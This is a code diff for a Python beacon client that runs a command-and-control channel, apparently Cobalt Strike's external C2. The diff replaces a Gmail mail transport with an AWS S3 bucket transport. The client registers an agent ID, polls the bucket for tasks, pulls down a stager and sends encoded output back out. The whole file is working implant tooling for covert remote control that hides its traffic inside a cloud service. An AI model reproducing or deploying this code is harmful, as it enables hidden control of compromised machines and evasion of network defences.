@@ -9,22 +9,30 @@ import base64
 import urllib
 
 # Transport imports:
-import email
-import imaplib
-from smtplib import SMTP
-from smtplib import SMTP_SSL
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEBase import MIMEBase
-from email.MIMEText import MIMEText
+import boto3
+import uuid
+from botocore.exceptions import ClientError
 from time import sleep
 
-# START GHETTO CONFIG, should be read in when compiled...
-GMAIL_USER = 'example@gmail.com'
-GMAIL_PWD = 'hunter2'
-SERVER = 'smtp.gmail.com'
-#SERVER_PORT = 587
-SERVER_PORT = 465
-# END GHETTO CONFIG
+#####################
+# Bootlegged Config #
+#####################
+
+# CS-S3-Agent user credentials with full access to S3
+# Instead of hardcoding, probably should hard-code an encryption
+# key and store in a publicly locatable place, then decrypt and pass to client.
+AWS_SECRET_KEY = 'YOUR_SECRET_KEY'
+AWS_ACCESS_KEY = 'YOUR_ACCESS_KEY'
+
+s3          = boto3.client('s3', aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)
+bucketName  = 'BUCKETNAME'
+beaconId    = str(uuid.uuid4())
+taskKeyName = beaconId + ':TaskForYou'
+respKeyName = beaconId + ':RespForYou'
+
+###################
+#    End Config   #
+###################
 
 # THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
 # <encoder functions>
@@ -42,53 +50,51 @@ def prepTransport():
 	return 0
 
 def sendData(data):
-	msg = MIMEMultipart()
-	msg['From'] = GMAIL_USER
-	msg['To'] = GMAIL_USER
-	msg['Subject'] = "Resp4You"
-	message_content = encode(data)
+	"""
+	Function to send data to the external C2. Before transmission
+	data _must_ be encoded using whatever encode functionality is
+	decided on.
 
-	msg.attach(MIMEText(str(message_content)))
-
-	while True:
-		try:
-			#mailServer = SMTP()
-			mailServer = SMTP_SSL(SERVER, SERVER_PORT)
-			# mailServer.connect(SERVER, SERVER_PORT)
-			#mailServer.ehlo()
-			#mailServer.starttls()
-			mailServer.login(GMAIL_USER,GMAIL_PWD)
-			mailServer.sendmail(GMAIL_USER, GMAIL_USER, msg.as_string())
-			mailServer.quit()
-			break
-		except Exception as e:
-			sleep(10) # wait 10 seconds to try again
+	This function should be _very_ similar to the server sendData.
+	"""
+    print 'got body contents to send'
+    s3.put_object(Body=encode(data), Bucket=bucketName, Key=respKeyName)
+    print 'sent ' + str(len(data)) + ' bytes'
 
 def recvData():
-	c= imaplib.IMAP4_SSL(SERVER)
-	c.login(GMAIL_USER, GMAIL_PWD)
-	c.select("INBOX")
+	"""
+	Function to receive data form external C2. Must decode data
+	from server using decode() method.
 
-	#typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'New4You')".format(uniqueid))
+	This function should be _very_ similar to the server retrieveData()
+	"""
 	while True:
-		typ, id_list = c.search(None, '(UNSEEN SUBJECT "New4You")')
-		print id_list[0].split()
-		if not id_list[0].split():
-			sleep(10) # wait for 10 seconds before checking again
-			c.select("INBOX")
-			typ, id_list = c.search(None, '(UNSEEN SUBJECT "New4You")')
-			pass
-		else:
-			for msg_id in id_list[0].split():
-				msg = c.fetch(msg_id, '(RFC822)')
-				#c.store(msg_id, '+FLAGS', '\SEEN')
-				msg = ([x[0] for x in msg][1])[1]
-				for part in email.message_from_string(msg).walk():
-					msg = part.get_payload()
-				# print msg
-				c.logout()
-				return decode(msg)
+		try:
+			resp = s3.get_object(Bucket=bucketName, Key=taskKeyName)
+			msg = resp['Body'].read()
+			msg = decode(msg)
+			s3.delete_object(Bucket=bucketName, Key=taskKeyName)
+			return msg
+		except ClientError as e:
+			if e.response['Error']['Code'] == 'NoSuchKey':
+				print '[-] No data to retrieve yet. Sleeping...'
+				sleep(5)
+			else:
+				raise e
 
+def registerClient():
+	"""
+	Function to register new beacon in external c2.
+	This should submit a unique identifier for the server to
+	identify the client with.
+
+	In this example, we put a new string AGENT:UUID into
+	the bucket to notify the server that a new agent is registering
+	with beaconId=uuid
+	"""
+	keyName = "AGENT:{}".format(beaconId)
+	s3.put_object(Body="", Bucket=bucketName, Key=keyName)
+	print "[+] Registering new agent {}".format(keyName)
 
 # </transport functions>
 
@@ -122,6 +128,8 @@ def WritePipe(hPipe,chunk):
 	return(ret)
 
 def go():
+	# Register beaconId so C2 server knows we're waiting
+	registerClient()
 	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
 	print "Waiting for stager..." # DEBUG
 	p = recvData()
